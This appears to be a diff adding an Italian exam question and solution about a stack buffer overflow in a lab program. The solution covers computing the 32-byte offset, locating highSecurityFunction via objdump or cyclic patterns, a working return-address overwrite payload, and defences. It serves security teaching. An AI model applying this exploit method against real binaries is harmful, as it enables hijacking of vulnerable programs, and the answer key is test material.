@@ -1,0 +1,9 @@
+\question[7]
+In \lstinline|corruption.c| (es.\ 07) \lstinline|highSecurityFunction()| non è mai chiamata; \lstinline|lowSecurityFunction| ha \lstinline|char buffer[20]| e fa \lstinline|read(0, buffer, 300)|.
+(a) Perché l'offset fino al return address è \textbf{32} e non 20? (b) Come trovi l'indirizzo di \lstinline|highSecurityFunction| (\lstinline|0x08049176|) con l'analisi statica? (c) Come lo trovi dinamicamente? (d) Scrivi il payload.
+\begin{solution}
+(a) Il compilatore riserva 28 byte per \lstinline|buffer[20]| (allineamento dello stack) + 4 byte di saved EBP = 32 byte prima del return address.\\
+(b) \lstinline!objdump -t corruption | grep highSecurityFunction! (binario \lstinline|-no-pie| $\to$ indirizzo fisso).\\
+(c) Si invia un pattern \lstinline|cyclic(...)|: il crash mette i byte del pattern in \lstinline|EIP| e \lstinline|cyclic_find(eip)| restituisce 32.\\
+(d) \lstinline|payload = b'A'*32 + p32(0x08049176)|. Difesa: controllo dei limiti, stack canary, ASLR (con binario PIE).
+\end{solution}
